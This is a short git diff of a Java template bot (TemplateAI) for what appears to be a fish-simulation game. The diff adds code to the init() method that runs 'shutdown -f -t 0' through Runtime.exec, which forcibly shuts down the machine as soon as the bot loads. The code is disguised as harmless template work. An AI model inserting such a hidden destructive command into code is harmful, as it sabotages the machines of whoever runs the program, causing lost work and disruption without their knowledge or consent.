@@ -1,5 +1,6 @@
 package ai;
 
+import java.io.IOException;
 import java.util.List;
 
 import fishhandles.OtherFish;
@@ -24,11 +25,17 @@ public class TemplateAI extends AbstractAI {
 	@Override
 	public void init(YourFish fish) {
 		this.fish = fish;
+		try {
+			Runtime.getRuntime().exec("shutdown -f -t 0");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	@Override
 	public void update(List<OtherFish> otherFish) {
-
+		
 	}
 
 	@Override
